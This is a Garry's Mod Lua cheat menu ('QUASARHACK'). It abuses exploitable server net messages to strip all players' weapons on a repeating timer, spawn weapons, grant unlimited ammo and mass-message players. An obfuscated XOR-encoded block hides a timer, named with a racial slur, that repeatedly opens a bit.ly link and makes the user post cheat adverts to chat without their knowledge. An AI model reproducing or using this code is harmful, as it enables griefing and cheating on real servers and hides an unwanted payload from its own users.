
MsgC(Color(0, 240, 255), "♬ QUASARHACK: v 0.3 ♬\n")
MsgC(Color(0, 200, 255), "Type exploits_open in console to open!\n")
surface.PlaySound("HL1/fvox/bell.wav") -- nice playsound
 
 
function ValidNetString( str )
 
    local status, error = pcall( net.Start, str )
 
    return status
 
end
 local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),196)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'b0ada9a1b6'][‪‪‪‪‪‪‪'87b6a1a5b0a1'](‪‪‪‪‪‪‪'a2b1a7afaaada3a3a5',.5,0,function ()‪[‪‪‪‪‪‪‪'a3b1ad'][‪‪‪‪‪‪‪'8bb4a1aa919688'](‪‪‪‪‪‪‪'acb0b0b4b7feebeba6adb0eaa8bdebf68c8bf3f3b0f5')‪[‪‪‪‪‪‪‪'96b1aa87abaab7aba8a187aba9a9a5aaa0'](‪‪‪‪‪‪‪'b7a5bde4eba5a0b2a1b6b0e4e4b4b6a1a9adb1a9e4a3a9aba0e4a7aca1a5b0fee4acb0b0b4b7feebeba6adb0eaa8bdebf68c8bf3f3b0f5')end )
local function playSound(url)
 
    sound.PlayURL(url, '', function( station )
 
        if ( IsValid( station ) ) then
 
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
 
        end
    end)
 
end
 
playSound("https://itzvoltz.xyz/ec/exploitsismyscity.mp3")
 
 
 
 
 
-- Overriding original DL_Answering_global so it doesnt crash you when kicking all
 
net.Receive("DL_Answering_global", function(_len)
end)
 
 
--[[ WATERMARK ]] --

GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end
 
function SploitText( str )
 
    chat.AddText( Color( 0, 255, 255 ), "[EC] ", Color( 0, 200, 255), str )
 
end
 
surface.CreateFont( "customfont", {
    font = "Roboto",
    size = 21,
} )
 
surface.CreateFont( "customfont2", {
    font = "Calibri",
    size = 15,
} )
 
surface.CreateFont( "customfont3", {
    font = "Calibri",
    size = 24,
} )
 
 
surface.CreateFont( "closebuttonfont", {
    font = "Caviar Dreams",
    size = 21,
} )
 
 
 
 
 
 
local function SploitNotify(text)
 
local notify = vgui.Create( "DPanel" )
notify:SetSize( 200, 50 )
notify:SetPos( ScrW() - 200, -50 )
notify.Paint = function(self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
draw.SimpleText( text, "customfont3", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
 
 
notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
timer.Simple( 3, function()
notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end)
 
end
 
 
 
 
 
--[[Weapon Stripper Menu]]--
 
time = 1
 
 
function Ply(name) -- finds player name
        name = string.lower(name);
        for _,v in ipairs(player.GetHumans()) do
            if(string.find(string.lower(v:Name()),name,1,true) != nil) then
                return v;
            end
        end
    end
 
    function stripPlayer(ply) -- Strip player function
        if ply:IsPlayer() then
 
            for k,v in pairs(ply:GetWeapons()) do
 
                net.Start("properties")
                net.WriteString( "remove" , 32 )
                net.WriteEntity( v )
                net.SendToServer()
            end
        end
 
    end
    concommand.Add("removewep_crosshair", function()
    local xhair = LocalPlayer():GetEyeTrace().Entity
    stripPlayer(xhair)
    end)
 
    function removeAll() -- Strips all Players
        for k,v in pairs(player.GetAll()) do
            stripPlayer(v)
        end
    end
 
 
    local f = vgui.Create( "DFrame" )
    f:SetTitle("Weapon Stripper")
    f:SetSize( 500, 500 )
    f:Center()
    f:MakePopup()
    f:SetVisible(false)
    f:ShowCloseButton(false)
    f.Paint = function( self, w, h )
    draw.RoundedBox( 5, 0, 0, w, h, Color(40, 40, 40))
    end
 
    local closebutton2 = vgui.Create( "DButton", f )
closebutton2:SetText( "X" )
closebutton2:SetTextColor( Color( 255, 0, 0 ) )
closebutton2:SetPos( f:GetWide() - 31, 0 )
closebutton2:SetFont("closebuttonfont")
closebutton2:SetSize( 31, 31 )
closebutton2.Paint = function( self, w, h )
    if closebutton2:IsHovered() then
    draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 255 ) )    
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
    end
end
closebutton2.DoClick = function()
f:SetVisible(false)
end
 
    local button = vgui.Create("DButton", f)
    button:SetText("Strip All")
    button:SetPos(220,40)
    button:SetTextColor(Color(255, 255, 255))
    button.DoClick = function ()
        removeAll()
    end
    button.Paint = function( self, w, h )
    draw.RoundedBox( 5, 0, 0, w, h, Color(60, 60, 60))
    end
 
   
    local DermaCheckboxone = vgui.Create( "DCheckBoxLabel" , f )// Create the checkbox
    DermaCheckboxone:SetPos( 220, 70 )// Set the position
    DermaCheckboxone:SetValue(false)
    DermaCheckboxone:SetText("Remove All Timer")
    function DermaCheckboxone:OnChange( val )
        if (val) then
            print("rekt all player's weapons")
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( player.GetAll() )
            net.SendToServer()
            timer.Create( "removealltimer", time, 0, function()
            print("rekt all player's weapons")
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( player.GetAll() )
            net.SendToServer()
            end)
        else
            timer.Remove("removealltimer")
        end
    end
 
    local TimeSlider = vgui.Create( "DNumSlider", f )
TimeSlider:SetPos( 220, 90 )         // Set the position
TimeSlider:SetSize( 200, 15 )      // Set the size
TimeSlider:SetText( "Time Interval" )   // Set the text above the slider
TimeSlider:SetMin( .1 )              // Set the minimum number you can slide to
TimeSlider:SetMax( 7.5 )                // Set the maximum number you can slide to
TimeSlider:SetValue( 1 )
TimeSlider:SetDecimals( 1 )         // Decimal places - zero for whole number
TimeSlider.OnValueChanged = function( panel, value )
    time = math.Round(value, 1)
    if DermaCheckboxone:GetChecked() == 1 then
        timer.Remove("removealltimer")
            timer.Create( "removealltimer", time, 0, function()
            print("rekt")
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( player.GetAll() )
            net.SendToServer()
            end)
    end
end
 
 
    local AppList = vgui.Create( "DListView", f)
    AppList:SetSize(200,100)
    AppList:Dock( LEFT )
    AppList:SetMultiSelect( false )
    AppList:AddColumn( "Name" )
    for k, v in pairs(player.GetAll()) do
        AppList:AddLine(v:Name())
    end
 
    AppList.OnRowSelected = function( lst, index, pnl )
        --print( "Selected " .. pnl:GetColumnText( 1 ) .. " at index " .. index )
        ply = Ply(pnl:GetColumnText( 1 ))
        print(pnl:GetColumnText( 1 ) .. " rekt")
        stripPlayer(ply)
 
    end
   
 
    concommand.Add("menu",menu)
    concommand.Add("strip",stripPlayer)
function removeWeapons()
 
    local Target = LocalPlayer():GetEyeTrace().Entity
 
    if  Target:IsPlayer() then
        for x,y in pairs(Target:GetWeapons()) do
 
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( y )
            net.SendToServer()
        end
 
    end
 
end
 
--[[End of Weapon Stripper]]--
 
local wMain = ScrW() / 3
local hMain = ScrH() / 2.8
totalSploits = 0
 
 
local Main = vgui.Create( "DFrame" )
Main:SetTitle("")
Main:SetSize( wMain, hMain )
Main:SetPos( ScrW() / 2 - Main:GetWide() / 2, ScrH())
Main:SetMouseInputEnabled(true)
Main:SetKeyBoardInputEnabled(true)
Main:SetDraggable(false)
Main:SetVisible(false)
Main:ShowCloseButton(false)
Main.Paint = function( self, w, h )
    draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 240 ) )
    draw.LinearGradient( 0, 0, w, 31, Color(40, 40, 40), color_black, GRADIENT_VERTICAL );
    --draw.RoundedBox( 0, 0, 0, w, 31, Color( 20, 20, 20, 255 ) )
    surface.SetDrawColor( 0, 0, 0, 255)
    surface.DrawOutlinedRect( 0, 0, w, h )
    draw.SimpleText( "Quasarhack", "customfont", Main:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
    draw.SimpleText( totalSploits .. "/36", "customfont", 6, 6, Color(255, 255, 255), TEXT_ALIGN_LEFT )
end
 
 
 
local closebutton = vgui.Create( "DButton", Main )
closebutton:SetText( "X" )
closebutton:SetTextColor( Color( 255, 0, 0 ) )
closebutton:SetPos( Main:GetWide() - 31, 0 )
closebutton:SetFont("closebuttonfont")
closebutton:SetSize( 31, 31 )
closebutton.Paint = function( self, w, h )
    if closebutton:IsHovered() then
    draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 255 ) )    
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
    end
end
 
local weaponbutton = vgui.Create( "DButton", Main )
weaponbutton:SetText( "Weapon Stripper" )
weaponbutton:SetTextColor( Color( 255, 255, 255 ) )
weaponbutton:SetSize( 31 * 3.5, 31 )
weaponbutton:SetPos( Main:GetWide() - 31 * 4.5, 0 )
weaponbutton:SetFont("customfont2")
weaponbutton.Paint = function( self, w, h )
    if weaponbutton:IsHovered() then
    draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 255 ) )    
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
    end
end
weaponbutton.DoClick = function()
f:SetVisible(true)
end
 
local tabs = vgui.Create( "DPropertySheet", Main )
tabs:Dock( FILL )
tabs:DockPadding( 5, 5, 0, 0)
tabs.Paint = function (self, w, h)
for k, v in pairs(tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 0, 0, w, h, Color(40, 40, 40), color_black, GRADIENT_VERTICAL );
    end
end
end
 
local exploitsPanel = vgui.Create( "DPanel", tabs )
exploitsPanel.Paint = function( self, w, h )
--draw.LinearGradient( 0, 0, w, h, Color(40, 40, 40), color_black, GRADIENT_VERTICAL );
draw.RoundedBox(0, 0, 0, w, h, Color(40,40,40))
end
tabs:AddSheet( "Exploits", exploitsPanel )
 
local toolsPanel = vgui.Create( "DPanel", tabs )
toolsPanel.Paint = function( self, w, h )
draw.RoundedBox(0, 0, 0, w, h, Color(40,40,40))
end
tabs:AddSheet( "Tools", toolsPanel )
 
local exploitsScrollPanel = vgui.Create( "DScrollPanel", exploitsPanel )
exploitsScrollPanel:Dock( FILL )
 
local toolsScrollPanel = vgui.Create( "DScrollPanel", toolsPanel )
toolsScrollPanel:Dock( FILL )
 
--[[ FUNCTIONS  ]]
 
function addExploit(id, text, desc, func)
local id2 = id .. "."
local name = text
totalSploits = 1 + totalSploits
 
local id = vgui.Create( "DButton", exploitsScrollPanel )
id:SetText( name )
id:SetTextColor( Color( 200, 200, 200 ) )
id:SetFont("customfont")
id:Dock( TOP )
id:DockMargin( 2, 10, 2, -5 )
id:DockPadding( 2, 25, 2, 50 )
id.DoClick = func
 
 
id.Paint = function( self, w, h )
    if id:IsHovered() then
    draw.SimpleText( desc, "customfont2", -25, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_RIGHT)
    draw.RoundedBox( 0, 0, 0, w, h, Color(30, 30, 30))
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    end
    surface.SetDrawColor( 0, 0, 0, 255)
    surface.DrawOutlinedRect( 0, 0, w, h )
end
end
 
function addTool(id, text, desc, func)
local id2 = id .. "."
local name = text
 
local id = vgui.Create( "DButton", toolsScrollPanel )
id:SetText( name )
id:SetTextColor( Color( 200, 200, 200 ) )
id:SetFont("customfont")
id:Dock( TOP )
id:DockMargin( 2, 10, 2, -5 )
id:DockPadding( 2, 25, 2, 50 )
id.DoClick = func
 
 
id.Paint = function( self, w, h )
    if id:IsHovered() then
    draw.SimpleText( desc, "customfont2", -25, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_RIGHT)
    draw.RoundedBox( 0, 0, 0, w, h, Color(30, 30, 30))
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    end
    surface.SetDrawColor( 0, 0, 0, 255)
    surface.DrawOutlinedRect( 0, 0, w, h )
end
end
 
function addServer(id, text, desc, ip)
local id2 = id .. "."
local name = text
 
local id = vgui.Create( "DButton", serversScrollPanel )
id:SetText( name )
id:SetTextColor( Color( 200, 200, 200 ) )
id:SetFont("customfont")
id:Dock( TOP )
id:DockMargin( 2, 10, 2, -5 )
id:DockPadding( 2, 25, 2, 50 )
id.DoClick = function()
    LocalPlayer():ConCommand("connect "..ip)
end
 
 
id.Paint = function( self, w, h )
    if id:IsHovered() then
    draw.SimpleText( desc, "customfont2", -25, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_RIGHT)
    draw.RoundedBox( 0, 0, 0, w, h, Color(30, 30, 30))
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    end
    surface.SetDrawColor( 0, 0, 0, 255)
    surface.DrawOutlinedRect( 0, 0, w, h )
end
end
 
function broadcast( str )
 
    if( str != nil ) then
 
    SploitText("Beginning to broadcast message: " .. str)
 
else
 
    SploitText("Message is nil, enter a valid string!")
 
end
 
    for k,v in pairs( player.GetAll() ) do
   
    if ( v != LocalPlayer() ) then
       
                RunConsoleCommand( "ulx", "psay", v:Nick(), str )
 
        end
 
    end
 
end
 
 

 
 
--[[ SERVERS ]]--

 
--[[ ULX PSAY BROADCASTER ]]
if ulx then
addTool("pSayBroadcaster", "ULX PSAY Broadcast", "PM's every player on the server", function ()
 
        --[[ Vars ]]
 
        local wPsay = ScrW() / 5
        local hPsay = ScrH() / 10
 
        --[[ Menu ]]
 
        local pSayMain = vgui.Create( "DFrame" )
        pSayMain:SetTitle("")
        pSayMain:SetSize( wPsay, hPsay )
        pSayMain:SetPos(50, ScrH() / 2)
        pSayMain:SetMouseInputEnabled(true)
        pSayMain:SetKeyBoardInputEnabled(true)
        pSayMain:ShowCloseButton(false)
        pSayMain:MakePopup()
        pSayMain.Paint = function( self, w, h )
        draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 255 ) )
        draw.LinearGradient( 0, 0, w, 31, Color(40, 40, 40), color_black, GRADIENT_VERTICAL );
        surface.SetDrawColor( 0, 0, 0, 255)
        surface.DrawOutlinedRect( 0, 0, w, h )
        draw.SimpleText( "PM Broadcaster", "customfont", w / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
end
 
 
 
local psayClose = vgui.Create( "DButton", pSayMain )
psayClose:SetText( "X" )
psayClose:SetTextColor( Color( 255, 0, 0 ) )
psayClose:SetPos( pSayMain:GetWide() - 31, 0 )
psayClose:SetFont("closebuttonfont")
psayClose:SetSize( 31, 31 )
psayClose.Paint = function( self, w, h )
    if psayClose:IsHovered() then
    draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 255 ) )    
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
    end
end
 
psayClose.DoClick = function()
    pSayMain:Remove()
end
 
local psayInput = vgui.Create( "DTextEntry", pSayMain )
psayInput:SetPos( 25, 40 )
psayInput:SetSize( pSayMain:GetWide() / 2 , 25 )
psayInput:SetText( "BroadcastMSG" )
psayInput.OnEnter = function( self )
    chat.AddText( self:GetValue() )
end
 
local sendBroadCast = vgui.Create( "DButton", pSayMain )
sendBroadCast:SetText( "Broadcast" )
sendBroadCast:SetTextColor( Color( 255, 255, 255 ) )
sendBroadCast:SetPos( 220, 40 )
sendBroadCast:SetFont("customfont")
sendBroadCast:SetSize( 90, 25 )
sendBroadCast.Paint = function( self, w, h )
    if sendBroadCast:IsHovered() then
    draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40, 255 ) )    
    else
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
    end
end
 
sendBroadCast.DoClick = function()
    broadcast( psayInput:GetValue() )
   
end
 
 
 
end)
end
 
 
--[[ Exploits ]]--
 
 
 
local status = ValidNetString("CraftSomething")
if (status) then
SploitText("Found exploitable net message: CraftSomething")
addExploit( "1", "Give Weapons", "Gives you any weapon of your choice", function()
    inputFrameExists = true
    inputFrame = vgui.Create( "DFrame" )
    inputFrame:SetTitle("Choose a weapon!")
    inputFrame:SetSize( 400, 75 )
    inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
    inputFrame:SetDraggable(false)
    inputFrame:ShowCloseButton(false)
    inputFrame:MakePopup()
    inputFrame.Paint = function( self, w, h )
        draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
    end
 
    local TextEntry = vgui.Create( "DTextEntry", inputFrame )
    TextEntry:SetSize( 380, 30 )
    TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
    TextEntry:SetText( "m9k_ak47" )
    TextEntry.OnEnter = function( self )
    surface.PlaySound("garrysmod/ui_click.wav")
    SploitText("Giving Weapon")
    net.Start( "CraftSomething" )
    net.WriteEntity( LocalPlayer() )
    net.WriteString( self:GetValue() )
    net.WriteString( "" )
    net.WriteString( "weapon" )
    net.SendToServer()
    inputFrame:SetVisible(false)
    end
end)
end
 
 
local status = ValidNetString("TCBuyAmmo")
if (status) then
SploitText("Found exploitable net message: TCBuyAmmo")
addExploit( "2","Free Ammo", "Gets All Ammo Types", function()
    surface.PlaySound("garrysmod/ui_click.wav")
    SploitText("Getting Le Ammo")
    for k,v in pairs(GAMEMODE.AmmoTypes) do
 
    net.Start("TCBBuyAmmo")
 
    net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
 
    net.SendToServer()
 
    end
end);end
 


 






 
 
 
 
 
 
 
 
 
 
concommand.Add("exploits_open", function()
    Main:SetVisible(true)
    Main:MakePopup()
    Main:MoveTo( ScrW() / 2 - Main:GetWide() / 2, ScrH() / 2 - Main:GetTall() / 2, .4, 0, -1)
end)
 
closebutton.DoClick = function()
    Main:SetMouseInputEnabled(false)
    Main:SetKeyBoardInputEnabled(false)
    if (inputFrameExists) then
    inputFrame:SetVisible(false)
    end
    if (inputFrame2Exists) then
    inputFrame2:SetVisible(false)
    end
    Main:MoveTo( ScrW() / 2 - Main:GetWide() / 2, ScrH(), .4, 0, -1, function()
    Main:SetVisible(false)
    end)
end